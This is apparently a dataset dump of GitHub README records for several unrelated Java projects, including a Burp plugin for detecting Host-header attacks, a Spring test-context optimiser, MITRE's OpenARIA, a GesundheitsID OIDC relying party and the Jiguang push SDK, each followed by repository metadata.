This README includes detailed instructions for setting up and running your application, along with configuration management practices, to ensure smooth deployment and operation. Adjustments may be necessary to fit your exact setup or additional features.



",0,0,1,mit,0.0
hy0jer/HostScan,main,"## 前言

该BP插件是在工作之余编写出来的，设计初衷是实现对host头攻击的全自动检测，这是作者第一次尝试编写bp插件，可以说是个Demo项目，如果有任何使用问题或者其他好的idea，可提交issues 

## 简介

该插件支持对host头攻击的全自动检测和主动扫描

#注意该BP插件使用MontoyaApi编写，不兼容旧版burp suite

## 安装流程

在burp suite的Extensions选项页面添加HostScan插件

![install](./images/install.png)

正常安装完毕后是如下页面显示

![install1](./images/install1.png)

![install2](./images/show.png)

### 使用说明

该插件支持两种运行方式，手动选择进行扫描以及自动扫描

### 自动扫描

安装后该插件初始状态默认设置自动扫描，即经过burp suite的流量都会进行扫描，如果检测到存在host头攻击会在Target选项页面以及HostScan插件详情页面显示具体情况，如下图所示

![78170bb6529f16e2d29c42e764c5142](./images/78170bb6529f16e2d29c42e764c5142.png)

![a5fff58bf98e935270f22d19e2dce85](./images/a5fff58bf98e935270f22d19e2dce85.png)



如果不想使用自动扫描，可点击该框关闭，如下所示

![operate](./images/operate.png)

![show](./images/install2.png)

### 主动扫描

右键选择需要检测的请求包通过extensions选项进行扫描

![ceaab9b923e2758cb57e885d6d1b500](./images/ceaab9b923e2758cb57e885d6d1b500.png)

如果检测出安全问题，会在详情页面显示

![b2a7c9ad2138e025550f49b9dd0377d](./images/b2a7c9ad2138e025550f49b9dd0377d.png)
",1,1,1,mit,0.0
seregamorph/spring-test-smart-context,master,"## Improving Spring Boot Test efficiency

### Problem statement
Spring test framework creates an application context according to test class configuration.
The context is cached and reused for all subsequent tests. If there is an existing context
with the same configuration, it will be reused. Otherwise, the new context will be created.
This is a very efficient and flexible approach, but it has a drawback: eventually this may
lead to out of memory errors if the number of unique configurations is too high and context
has a lot of heavyweight beans like TestContainers. In many cases simple static bean 
definition can help, but this project suggests another approach: reordering test classes
and eager context cleanup.

Consider a sample test suite of 8 classes that use 4 different configurations, classes that have the same configuration
are marked with the same colour:

<img src=""doc/sample-test-suite.png"" alt=""Sample test suite"" width=""700""/>

In a large test suites as well as in shared CI/CD environments with lots of test pipelines
working simultaneously this may eventually lead to out of memory errors
in Java process or Docker host.

### Proposed solution
It's recommended to use statically-defined TestContainers beans, optimize reusing same configuration between tests 
e.g. via common test super-classes.
But additionally this library makes two optimizations:
* test class execution is reordered to group tests with the same context configuration so they
can be executed sequentially
* the order of tests is known, so if current test class is last per current configuration, the spring context
will be automatically closed (it's called `Smart DirtiesContext`) and the beans will be disposed releasing resources

As a result, in a suite of single module there will always be not more than 1 active spring contexts:

<img src=""doc/reorder-and-smart-dirties-context.png"" alt=""Reordered suite with smart DirtiesContext"" width=""700""/>

This chart is done via calculating the number of active docker containers while executing a suite of 120 integration
test classes that actively uses TestContainers for databases (several datasources simultaneously) and other services:

<img src=""doc/active-docker-containers.png"" alt=""Number of active docker containers"" width=""700""/>

As shown on the chart, the suite just fails with OOM without the optimization.
As an advantage, the total test execution time will also become less, because resource consumption (especially memory)
will be reduced, hence tests are executed faster.

### References
This idea was submitted to the Spring Framework team as a feature request:
* https://github.com/spring-projects/spring-framework/issues/32289

Public presentation with AtomicJar (TestContainers creators):
* https://www.youtube.com/watch?v=_Vci_5nr8R0

### Limitations
At the moment only single thread test execution per module is supported. Parallel test execution is work in progress.
Also there can be problems with Jupiter
[Nested](https://junit.org/junit5/docs/current/user-guide/#writing-tests-nested) test classes.

### Supported versions
`Java` 8+ (`Java` 17+ for spring-boot 3.x projects)

`Spring Boot` 2.4+, 3.x as well as bare Spring framework

Supported test frameworks:
* `JUnit 4` (via JUnit 5 [junit-vintage-engine](https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running))
* `JUnit 5 Jupiter`
* `TestNG` (both bare TestNG and JUnit platform [testng-engine](https://github.com/junit-team/testng-engine))

`Gradle Enterprise Maven Extension` (test execution caching) correctly supports changed behaviour

### How to use
Add maven dependency (available in maven central):
```xml
<dependency>
    <groupId>com.github.seregamorph</groupId>
    <artifactId>spring-test-smart-context</artifactId>
    <version>0.3</version>
    <scope>test</scope>
</dependency>
```
Or Gradle dependency:
```groovy
testImplementation(""com.github.seregamorph:spring-test-smart-context:0.3"")
```
It's recommended to check [Demo projects](demo).

### How it works

<details>
  <summary>JUnit 5 Jupiter</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesClassOrderer](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/SmartDirtiesClassOrderer.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
or even inherited from
[AbstractJUnitSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/AbstractJUnitSpringIntegrationTest.java)
</details>

<details>
  <summary>TestNG</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesSuiteListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/SmartDirtiesSuiteListener.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
The integration test classes should add
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
Note: the annotation is inherited, so it makes sense to annotate the base test class or use
[AbstractTestNGSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/AbstractTestNGSpringIntegrationTest.java)
parent.
</details>

<details>
  <summary>JUnit 4</summary>

Note: support of JUnit 4 is planned to be removed in version 1.0 (will stay available in 0.x versions).

The JUnit 4 does not provide standard way to reorder test class execution, but it's still possible via
[junit-vintage-engine](https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running).
This dependency should be added to test scope of the module:
```xml
<dependency>
    <groupId>org.junit.vintage</groupId>
    <artifactId>junit-vintage-engine</artifactId>
    <scope>test</scope>
</dependency>
```
or for Gradle (see [detailed instruction](https://docs.gradle.org/current/userguide/java_testing.html#executing_legacy_tests_with_junit_vintage)):
```groovy
testRuntimeOnly('org.junit.vintage:junit-vintage-engine')
testRuntimeOnly('org.junit.platform:junit-platform-launcher')
```
Also the `surefire`/`failsafe` plugins should be configured to use junit-platform:
```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-surefire-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-failsafe-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
```
or for Gradle:
```groovy
tasks.named('test', Test) {
    useJUnitPlatform()
}
```

For projects with JUnit 4 it will automatically setup
[SmartDirtiesPostDiscoveryFilter](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesPostDiscoveryFilter.java)
which will reorder test classes on the level of junit-launcher and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
or even inherited from
[AbstractJUnit4SpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/junit4/AbstractJUnit4SpringIntegrationTest.java)
</details>

### Additional materials
* See the online presentation of the project https://www.youtube.com/watch?v=_Vci_5nr8R0 hosted by 
[AtomicJar](https://www.atomicjar.com/), the creators of [TestContainers](https://testcontainers.com/) framework.
* Presentation slides: [Miro board](https://miro.com/app/board/uXjVN3KJeCI=/?share_link_id=309027962805)

### Known projects using library
<img src=""doc/miro-logo.png"" alt=""Miro"" width=""120""/>

[Miro](https://miro.com/) is using this approach to optimize huge integration test suites and it saved a lot of resource
for CI/CD pipelines.
",3,0,3,apache-2.0,6.0
zOnlyKroks/P2P,1.20.4,,0,1,9,mit,5.0
mitre-public/open-aria,main,"
![aria logo picture](./docs/assets/DFW-Airspace-Graph.gif)

[![Java CI with Gradle](https://github.com/mitre-public/open-aria/actions/workflows/gradle.yml/badge.svg)](https://github.com/mitre-public/open-aria/actions/workflows/gradle.yml)
[![License](https://img.shields.io/:license-apache-brightgreen.svg)](http://www.apache.org/licenses/LICENSE-2.0.html)

# Welcome to OpenARIA

This repository contains an open-source edition of the _Aviation Risk Identification and Assessment_ (ARIA) software
program developed by MITRE on behalf of the Federal Aviation Administration's (FAA) Safety and Technical Training (AJI)
Service Unit.

## OpenARIA's Goal

Our goal is to build a community focused on improving aviation safety & efficiency by extracting value from aircraft
location data.

## How OpenARIA can achieve this Goal

1. Provide a publicly available solution for **detecting aviation risks** within aircraft location data.
    - This tangible working solution can be critiqued by the community and improved as necessary.


2. Provide a publicly available solution for detecting **and then aggregating** aviation risks for bulk
   analysis.
    - Someone operating `OpenARIA` for a day will have one day's worth of output
    - Someone operating `OpenARIA` for a year will have a year's worth of output.
    - We must facilitate capturing and utilizing large amounts of output data.


3. Provide a publicly available solution for **archiving and replaying** aircraft location data
    - E.g., when `OpenARIA` detects _an event_, we will want to be able to replay the event to understand what happened.


4. Provide solutions that work with near-real time data streams as well as archival data.

---

# Getting Started

- Learn about important ongoing work [here](./docs/ADRs/supportingNewFormats.md)
  and [here](./docs/ADRs/pointInterfaceCritique2.md)
- Learn about the supported data formats [here](./docs/csv-data-format.md)
    - **Important Caveat:** The initial code commit includes a dependency that is not available in the open source
      domain.
    - We are working to remove this blocker by:
        1. Proposing [this](./docs/csv-data-format.md) data format (which will replace the legacy format)
        2. Adding support for this new data format
        3. Refactoring the code so the closed-source dependency is no longer used or required.
        4. Building the project using **only** GitHub Actions and publicly available dependencies
    - You can view the progress of this work by browsing the branches of the project.
- To begin **detecting aviation events** see [here](./docs/how-to/detect-encounters.md)
- To begin **archiving and replaying** aircraft location data see [here](./docs/how-to/replay-encounters.md)
- To begin detecting **and then aggregating** aviation data see [here](./docs/how-to/aggregate-encounters.md)_

## Building from Source

1. First clone the project: `git clone git@github.com:mitre-public/open-aria.git`
2. Navigate to project directory `cd {PATH_TO_REPOSITORY}/open-aria`
3. Run: `./gradlew shadowJar`
    - This command launches a build plugin that collects all compiled code and dependencies into a single
      jar (aka _uber jar_, _shadow jar_, or _fat jar_)
4. Find the _uber jar_ in: 
    - `{PATH_TO_REPOSITORY}/open-aria/open-aria-deploy/libs/build`
    - The _uber jar_ will have a name like: `open-aria-0.1.0-SNAPSHOT-uber.jar`

## Downloading Pre-Built Artifact
There are 2 places to simply download a pre-built artifact
1. Download a full release from [here](https://github.com/mitre-public/open-aria/releases)
   - **Coming soon** (ETA = June 1st)
2. Download the artifact produced during a recent execution of the CI/CD system.
   - Click [here](https://github.com/mitre-public/open-aria/actions/workflows/gradle.yml) to see the list of recent builds
   - Click on any build from the last 90 days (GitHub stores build artifacts for 90-days)
   - Download the Artifact named: `Deployable-Uber-Jar`

- [ ] TODO: Publish full releases to Maven Central.

---

# Documentation

- [High-level source code summary](docs/codeIntro.md)


- **About ARIA's Airborne Event Data**
    - An example of this JSON output data is [here](open-aria-airborne/src/test/resources/scaryTrackOutput.json)
    - A PDF describing the output data is [here](open-aria-airborne/airborneDataSpec_v3.pdf)


- **Architectural Decision Records (ADRs)**
    - [Supporting New Data Formats](./docs/ADRs/supportingNewFormats.md)
    - [Critique of Point and Track interfaces](docs/ADRs/pointInterfaceCritique.md)
    - [Why YAML configs are preferable to Properties](docs/ADRs/yamlOverProperties.md)
    - [How to compute an event's uniqueId](docs/ADRs/computingUniqueId.md)

---

# Using and Contributing

First of all, **Welcome to the community!**

### Contributing as a User

- **Please submit feedback.**
- Do you have a technical question? If so, please ask. We are here to help. Your question could lead to improvements.
  User questions lead to improved documentation, understanding defects, and eventually code improvements the reach
  everyone in the community.
- Do you have a feature request? If so, please ask. We'll see what we can do given the development time we have
  available.

### Contributing as a Developer

- We will use GitHub's Issue tracking features when the project launches.
- Anyone interested in making technical contributions is welcomed to communicate with the dev team on GitHub. Feel free
  to submit issues, fix issues, and submit PRs.
- We may write a _""contributing guidelines""_ document in the future should the need arise. But for now, our focus will
  be on making high-quality, high-value improvements to the code (not policy documents).

### Contributing as a Data Provider

- OpenARIA is **extremely** interested in collecting shareable aircraft position datasets. Publicly available datasets
  can become the benchmarks dataset by which OpenARIA algorithms are measured and optimized. Read more [here](docs/shared-datasets.md) about
  the fundamental project need.

---

# Near-Term Project RoadMap

![Road Map Figure](docs/assets/OpenARIA-Roadmap.png)

### Version History & Release Notes

See [here](docs/version-release-notes.md)

### MITRE Public Release

- Content approved for public release via The MITRE Corporation's ""Public Release System"" (PRS)
- Reference:  `Public Release Case Number: 23-3623`

### Legal Statement

- **Copyright:** The contents of this project is copyright `The MITRE Corporation`. See details [here](COPYRIGHT.txt) .
- **Open Source License:** This project is released under the Apache License Version 2.0. See details [here](LICENSE).
",1,11,2,apache-2.0,36.0
dr-hextanium/cookbook,main,,0,7,2,mit,25.0
microcks/microcks-testcontainers-java-spring-demo,main,"# Microcks Testcontainers Spring Boot Demo

![Microcks Testcontainers Spring demo](./assets/microcks-testcontainers-java-spring-demo.png)

This application is a demonstration on how to integrate Microcks via [Testcontainers]([https://www.testcontainers.com]) within your development inner-loop.

You will work with a Spring Boot application and explore how to:
* Use Microcks for **provisioning third-party API mocks**,
* Use Microcks for **simulating external Kafka events publishers**,
* Write tests using Microcks **contract-testing** features for both **REST/OpenAPI based APIs and Events/AsyncAPI** based messaging

## Table of contents

* [Step 1: Getting Started](step-1-getting-started.md)
* [Step 2: Exploring the app](step-2-exploring-the-app.md)
* [Step 3: Local Development Experience with Microcks](step-3-local-development-experience.md)
* [Step 4: Write Tests for REST](step-4-write-rest-tests.md)
* [Step 5: Write Tests for Async](step-5-write-async-tests.md)

## License Summary

The code in this repository is made available under the MIT license. See the [LICENSE](LICENSE) file for details.
",0,0,6,mit,12.0
oviva-ag/ehealthid-relying-party,main,"[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=oviva-ag_ehealthid-relying-party&metric=alert_status&token=ee904c8acea811b217358c63297ebe91fd6aee14)](https://sonarcloud.io/summary/new_code?id=oviva-ag_ehealthid-relying-party)
[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=oviva-ag_ehealthid-relying-party&metric=coverage&token=ee904c8acea811b217358c63297ebe91fd6aee14)](https://sonarcloud.io/summary/new_code?id=oviva-ag_ehealthid-relying-party)

# OpenID Connect Relying Party for GesundheitsID (eHealthID)

The goal is to provide a simple standalone server exposing Germany's 'GesundheitsID' (eHealthID) as
a good old OpenID Connect Relying Party (OIDC RP).

Identity Providers such as Keycloak can link accounts with OIDC out-of-the-box

## State of Compatibility

### Productive Environment (PU)

| Sectoral IdP           | End-to-End | Provider |
|------------------------|------------|----------|
| Techniker Krankenkasse | ✅          | IBM      |
| Gothaer                | 🚫         | RISE     |

> [!NOTE]  
> Most providers can not be independently tested as there are no test accounts available.

## Authentication Flow IDP / Relying Party

```mermaid
sequenceDiagram
    participant app as Mobile App
    participant idp as Your IDP
    participant rp as Relying Party
    app ->> idp: login
    idp -->> app: redirect to Relying Party (OIDC)
    app ->> rp: login
    note over app, rp: login via eHealthID handled by Relying Party (RP)
    rp -->> app: redirect to IDP with code
    app ->> idp: success, callback to IDP
    idp ->> rp: redeem code
    rp -->> idp: id_token
    idp -->> app: success! redirect
```

## Contents

- [ehealthid-rp](./ehealthid-rp) - A standalone application to act as a OpenID Connect (OIDC)
  Relying Party. Bridges OIDC and Germany's GesundheitsID OpenID federation.
- [ehealthid-cli](./ehealthid-cli) - A script to generate keys and federation registration forms.
- [ehealthid](./ehealthid) - A plain Java library to build RelyingParties for GesundheitsID.
    - API clients
    - Models for the EntityStatments, IDP list endpoints etc.
    - Narrow support for the 'Fachdienst' use-case.

# Quickstart

```shell

#---- 1. generate keys
# the URI where your relying-party will run, 
# for the registration this _MUST_ be publicly reachable
export ISSUER_URI=https://mydiga.example.com

# generate keys for the application, keep those safe and secure
./cli.sh keygen --issuer-uri=$ISSUER_URI

#---- 2. deploy the relying party
docker run --rm \
    -v ""$(pwd)""/sig_mydiga_example_com_jwks.json:/secrets/sig_jwks.json:ro \
    -e ""EHEALTHID_RP_APP_NAME=Awesome DiGA"" \
    -e ""EHEALTHID_RP_BASE_URI=$ISSUER_URI"" \
    -e 'EHEALTHID_RP_FEDERATION_ES_JWKS_PATH=/secrets/sig_jwks.json' \
    -e 'EHEALTHID_RP_FEDERATION_MASTER=https://app-test.federationmaster.de' \
    -e 'EHEALTHID_RP_REDIRECT_URIS=https://sso-mydiga.example.com/auth/callback' \
    -e 'EHEALTHID_RP_ES_TTL=PT5M' \
    -e 'EHEALTHID_RP_IDP_DISCOVERY_URI=https://sso-mydiga.example.com/.well-known/openid-configuration' \
    -p 1234:1234 \
    ghcr.io/oviva-ag/ehealthid-relying-party:latest

#---- 3. register with the federation master

# a string received from Gematik as part of the registration process
# see: https://wiki.gematik.de/pages/viewpage.action?pageId=544316583
export MEMBER_ID=FDmyDiGa0112TU

# generate the registration XML from an existing entity statement
./cli.sh fedreg \
    --environment=TU \
    --contact-email=bobby.tables@example.com \
    --issuer-uri=$ISSUER_URI \
    --member-id=""$MEMBER_ID""
    
# this prints the XML for registration in the federation, send it
# as an email attachment to Gematik 
# see: https://wiki.gematik.de/pages/viewpage.action?pageId=544316583
```

**IMPORTANT:**

- The relying party __MUST__
  be [registered within the OpenID federation](https://wiki.gematik.de/pages/viewpage.action?pageId=544316583)
  to work fully.
- In order to register for the federation, your entity statment __MUST__ be publicly available.

Once the server is booted, it will:

1. Expose an OpenID Discovery document at `$EHEALTHID_RP_BASE_URI/.well-known/openid-configuration`
   ```shell
    curl $BASE_URI/.well-known/openid-configuration | jq .
    ```

2. Expose an OpenID Federation entity configuration
   at `$EHEALTHID_RP_BASE_URI/.well-known/openid-federation`
   ```shell
    curl $BASE_URI/.well-known/openid-federation | jwt decode -j - | jq .payload
    ```

3. Be ready to handle OpenID Connect flows and handle them via Germany's GesundheitsID federation.

## Configure Identity Provider

Generic settings:

- the relying party OpenID configuration is at `$ISSUER_URI/.well-known/openid-configuration`
    - token_url: `/auth/token`
    - auth_url: `/auth`
    - jwks_url: `/jwks.json`
- the only supported client authentication is `private_key_jwt`, the public keys will be discovered

## Example: Keycloak OpenID Connect Identity Provider Settings

As an example with `https://t.oviva.io` as the relying party issuer.
![](./keycloak_config.png)

# Configuration

Use environment variables to configure the relying party server.

(*) required configuration

| Name                                         | Description                                                                                                                                                                | Example                                                           |
|----------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------|
| `EHEALTHID_RP_FEDERATION_ES_JWKS_PATH`*      | Path to a JWKS with at least one keypair for signature of the entity statement. All these keys __MUST__ be registered with the federation master.                          | `./sig_jwks.json`                                                 |
| `EHEALTHID_RP_OPENID_RP_SIG_JWKS_PATH`*      | Path to a JWKS with signing keys of our relying party, i.e. for mTLS client certificates                                                                                   | `./openid_rp_sig_jwks.json`                                       | 
| `EHEALTHID_RP_OPENID_RP_ENC_JWKS_PATH`*      | Path to a JWKS with the keys used for encryption between the federation and the relying party, i.e. to encrypt id_tokens                                                   | `./openid_rp_enc_jwks.json`                                       |
| `EHEALTHID_RP_REDIRECT_URIS`*                | Valid redirection URIs for OpenID connect.                                                                                                                                 | `https://sso-mydiga.example.com/auth/callback`                    |
| `EHEALTHID_RP_BASE_URI`*                     | The external base URI of the relying party. This is also the `issuer` towards the OpenID federation. Additional paths are unsupported for now.                             | `https://mydiga-rp.example.com`                                   |
| `EHEALTHID_RP_IDP_DISCOVERY_URI`*            | The URI of the discovery document of your identity provider. Used to fetch public keys for client authentication.                                                          | `https://sso-mydiga.example.com/.well-known/openid-configuration` |
| `EHEALTHID_RP_FEDERATION_MASTER`*            | The URI of the federation master.                                                                                                                                          | `https://app-test.federationmaster.de`                            |
| `EHEALTHID_RP_APP_NAME`*                     | The application name within the federation.                                                                                                                                | `Awesome DiGA`                                                    |
| `EHEALTHID_RP_HOST`                          | Host to bind to.                                                                                                                                                           | `0.0.0.0`                                                         |
| `EHEALTHID_RP_PORT`                          | Port to bind to.                                                                                                                                                           | `1234`                                                            |
| `EHEALTHID_RP_ES_TTL`                        | The time to live for the entity statement. In ISO8601 format.                                                                                                              | `PT12H`                                                           |
| `EHEALTHID_RP_SCOPES`                        | The comma separated list of scopes requested in the federation. This __MUST__ match what was registered with the federation master.                                        | `openid,urn:telematik:versicherter`                               |
| `EHEALTHID_RP_SESSION_STORE_TTL`             | The time to live for sessions. In ISO8601 format.                                                                                                                          | `PT20M`                                                           |
| `EHEALTHID_RP_SESSION_STORE_MAX_ENTRIES`     | The maximum number of sessions to store. Keeps memory bounded.                                                                                                             | `1000`                                                            |
| `EHEALTHID_RP_CODE_STORE_TTL`                | The time to live for codes, i.e. successful logins where the code is not redeemed yet. In ISO8601 format.                                                                  | `PT5M`                                                            |
| `EHEALTHID_RP_CODE_STORE_MAX_ENTRIES`        | The maximum number of codes to store. Keeps memory bounded.                                                                                                                | `1000`                                                            |
| `EHEALTHID_RP_LOG_LEVEL`                     | The log level.                                                                                                                                                             | `INFO`                                                            |
| `EHEALTHID_RP_OPENID_PROVIDER_SIG_JWKS_PATH` | Path to a JWKS with signing keys for our openIdProvider, for example the id_token issued by the relying party will be signed with it. Will be generated if not configured. | `./openid_provider_sig_jwks.json`                                 |

# Generate Keys & Register for Federation

In order to participate in the GesundheitsID one needs to register the entity statement of the IDP
or in this case the relying party here.

To simplify matter, here a script to generate fresh keys as well as the XML necessary to register
with Gematik.

See [Gematik documentation](https://wiki.gematik.de/pages/viewpage.action?pageId=544316583) for
details on the registration process.

```shell
./cli.sh --help
```

## Authentication flow between all involved parties

**NOTE:** There are some additional interactions within the federation, for a more complete flow see
[AppFlow](https://wiki.gematik.de/display/IDPKB/App-App+Flow#AppAppFlow-0-FederationMaster) in the
Gematik documentation.

```mermaid
sequenceDiagram
    participant app as Mobile App
    participant idp as Your IDP
    participant rp as Relying Party
    participant secIdp as Sectoral IDP
    participant fedmaster as Federation Master
    app ->> idp: login
    idp -->> app: redirect to Relying Party (OIDC)
    app ->> rp: login
    alt relying party & eHealthID federation
        rp ->> fedmaster: fetch list of sectoral IDPs
        fedmaster -->> rp: list of sectoral IDPs
        rp -->> app: show list of IDPs to select from
        app ->> rp: select an IDP
        rp ->> secIdp: get redirect url (PAR)
        secIdp -->> rp: redirect_uri
        rp -->> app: redirect to sectoral authentication (e.g. ident app)
        alt proprietary flow
            app ->> secIdp: authenticate
            secIdp ->> app: success, redirect to relying party
        end
        app ->> rp: success, callback to relying party
        rp ->> secIdp: fetch id_token
        secIdp -->> rp: id_token
    end
    rp -->> app: redirect to IDP with code
    app ->> idp: success, callback to IDP
    idp ->> rp: redeem code
    alt client authentication
        note right of rp: client authenticated via 'private_key_jwt'
        rp ->> idp: fetch OpenID discovery document
        idp -->> rp: discovery document
        rp ->> idp: fetch JWKS
        idp -->> rp: JWKS
        note right of rp: verifies client JWT with discovered JWKS
    end
    rp -->> idp: id_token
    idp -->> app: success! redirect
```

# Testing

**See [TESTING](./TESTING.md).**

# Limitations

- for now sessions are stored in-memory, this implies:
    - rebooting the server will force users currently logging-in to restart
    - if multiple instances run, sessions must be sticky (e.g. use `session_id` cookie)
    - though it would be relatively straight forward to use a database instead
- this is tested in the 'Testumgebung' (TU) against the Gematik IDP due to a lack of other options

# Open Points

- end-to-end tests with Verimi, Gematik, RISE and IBM IDPs, most lack options to test currently

# Wishlist

- Accept base URI's with paths.
- MySQL or Postgres backed session and code repos
- PKCE flow on OIDC side
- Integration with other IDPs such as [FusionAuth](https://fusionauth.io/)

# Helpful Links

- [OpenID Federation Spec](https://openid.net/specs/openid-federation-1_0.html)
- [Gematik Fachdienst Specifications](https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_FD/latest/)
- [Gematik Fedmaster Specification](https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_FedMaster/latest/)
- [Gematik Sectoral IDP Specifications](https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_Sek/latest/)
- [AppFlow - Authentication flow to implement](https://wiki.gematik.de/display/IDPKB/App-App+Flow#AppAppFlow-0-FederationMaster)
- [Sektoraler IDP - Examples & Reference Implementation](https://wiki.gematik.de/display/IDPKB/Sektoraler+IDP+-+Referenzimplementierung+und+Beispiele)
",22,3,46,apache-2.0,69.0
YvanMazy/TransferProxy,master,,8,0,1,mit,1.0
kousen/springaiexamples,main,"## Spring AI Examples

A set of examples for use with the Spring AI project, based on their original Azure workshop (but without Azure).

### Links

* https://docs.spring.io/spring-ai/reference/index.html (Spring AI reference page)
* https://github.com/spring-projects/spring-ai (Spring AI GitHub repository)
* https://github.com/Azure-Samples/spring-ai-azure-workshop (Spring AI Azure workshop)
* https://platform.openai.com/docs/overview (OpenAI documentation)
* https://platform.openai.com/signup (OpenAI signup for key)
* https://github.com/kousen/OpenAIClient (My GitHub repo)
* https://github.com/kousen/springaiexamples (solutions to our exercises)
* https://kenkousen.substack.com (_Tales from the jar side_ newsletter)
* https://youtube.com/@talesfromthejarside (_Tales from the jar side_ YouTube channel)
",0,0,1,mit,0.0
jpush/jiguang-sdk-java,main,"# jiguang-sdk-java

这是 Jiguang REST API 的 Java 版本封装开发包，是由极光推送官方提供的，一般支持最新的 API 功能。

对应的 REST API 文档：
* [REST API - Push](https://docs.jiguang.cn/jpush/server/push/rest_api_v3_push)
* [REST API - Device](https://docs.jiguang.cn/jpush/server/push/rest_api_v3_device)
* [REST API - Report](https://docs.jiguang.cn/jpush/server/push/rest_api_v3_report)
* [REST API - Admin](https://docs.jiguang.cn/jpush/server/push/rest_api_admin_api_v1)
* [REST API - GroupPush](https://docs.jiguang.cn/jpush/server/push/rest_api_v3_push_grouppush)

支持 Java JDK 1.8 及其以上版本。
> 支持 Java JDK 1.6 版本：[jpush-api-java-client](https://github.com/jpush/jpush-api-java-client)，但不再更新。

## 1. 集成
引入sdk包
```xml
<!--以5.1.9版本为例-->
<dependencies>
        <!-- jiguang-sdk -->
        <dependency>
            <groupId>io.github.jpush</groupId>
            <artifactId>jiguang-sdk</artifactId>
            <version>5.1.9</version>
        </dependency>
</dependencies>
```
引入log包
> 注意项目中已引用了logback、log4j、commons-logging等实现slfj接口的日志框架，则不需要配置。例如'example-for-spring'中引入了spring，自带logback框架，就不需要再配置。
```xml
<!--以logback为例-->
<dependencies>
    <!-- logback -->
    <dependency>
        <groupId>ch.qos.logback</groupId>
        <artifactId>logback-classic</artifactId>
        <version>1.2.11</version>
    </dependency>
</dependencies>
```
## 2. Api
创建api对象
> 可根据自身情况设置client、host和loggerLevel
```java
        // appKey和masterSecret在极光官网-应用控制台获取
        PushApi pushApi = new PushApi.Builder()
            .setAppKey(appKey)
            .setMasterSecret(masterSecret)
            .build();

        DeviceApi deviceApi = new DeviceApi.Builder()
            .setAppKey(appKey)
            .setMasterSecret(masterSecret)
            .build();

        ReportApi reportApi = new ReportApi.Builder()
            .setAppKey(appKey)
            .setMasterSecret(masterSecret)
            .build();

        // devKey和devSecret在极光官网-右上角-个人主页获取
        AdminApi adminApi = new AdminApi.Builder()
            .setDevKey(devKey)
            .setDevSecret(devSecret)
            .build();

        // groupKey和groupMasterSecret在极光官网-分组应用控制台获取
        GroupPushApi groupPushApi = new GroupPushApi.Builder()
            .setGroupKey(groupKey)
            .setGroupMasterSecret(groupMasterSecret)
            .setLoggerLevel(Logger.Level.FULL)
            .build();

        // 设置client
        okhttp3.OkHttpClient okHttpClient = new okhttp3.OkHttpClient().newBuilder()
                .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(""proxy_host"", proxy_port))) // set proxy
                .connectTimeout(5, TimeUnit.SECONDS) // set connect timeout
                .build();
        OkHttpClient client =new OkHttpClient(okHttpClient);            
            
        PushApi pushApi = new PushApi.Builder()
                .setClient(new OkHttpClient(client))
                .setAppKey(appKey)
                .setMasterSecret(masterSecret)
                .build();
```
使用api示例
* [PushApi](https://github.com/jpush/jiguang-sdk-java/blob/main/example-for-spring/src/test/java/cn/jiguang/app/api/PushApiTest.java)
* [DeviceApi](https://github.com/jpush/jiguang-sdk-java/blob/main/example-for-spring/src/test/java/cn/jiguang/app/api/DeviceApiTest.java)
* [ReportApi](https://github.com/jpush/jiguang-sdk-java/blob/main/example-for-spring/src/test/java/cn/jiguang/app/api/ReportApiTest.java)
* [AdminApi](https://github.com/jpush/jiguang-sdk-java/blob/main/example-for-spring/src/test/java/cn/jiguang/app/api/AdminApiTest.java)
* [GroupPushApi](https://github.com/jpush/jiguang-sdk-java/blob/main/example-for-spring/src/test/java/cn/jiguang/app/api/GroupPushApiTest.java)
## 3. 推送失败
